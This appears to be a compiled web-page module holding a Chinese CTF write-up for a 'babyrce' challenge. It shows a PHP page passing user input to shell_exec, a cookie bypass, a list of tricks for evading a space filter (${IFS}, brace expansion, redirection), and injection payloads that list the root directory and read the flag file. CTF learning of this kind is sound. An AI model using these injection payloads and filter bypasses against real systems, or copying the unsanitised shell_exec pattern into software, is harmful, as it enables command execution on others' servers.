import{_ as n,o as s,c as a,e as t}from"./app-bd32c210.js";const e={},p=t(`<p>#RCE</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;admin&#39;</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>       
		<span class="token keyword">include</span> <span class="token string double-quoted-string">&quot;../next.php&quot;</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>
	<span class="token keyword">else</span>       
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;小饼干最好吃啦！&quot;</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>添加 session: admin=1 返回提示 rasalghul.php 查看该文件</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;url&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;url&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/ /&quot;</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;nonono&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
	<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>过滤了空格</p><div class="language-txt line-numbers-mode" data-ext="txt"><pre class="language-txt"><code>在CTF比赛中，命令中空格被过滤的解决方法
{cat,flag.txt}
cat\${IFS}flag.txt
cat$IFS$9flag.txt
cat&lt;flag.txt
cat&lt;&gt;flag.txt
kg=$&#39;\\x20flag.txt&#39;&amp;&amp;cat$kg
(\\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里选择\${IFS}替代空格</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?url=ls\${IFS}/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>得到目录</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?url=cat\${IFS}/fl*
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>得到 flag</p>`,11),i=[p];function l(c,o){return s(),a("div",null,i)}const d=n(e,[["render",l],["__file","babyrce.html.vue"]]);export{d as default};
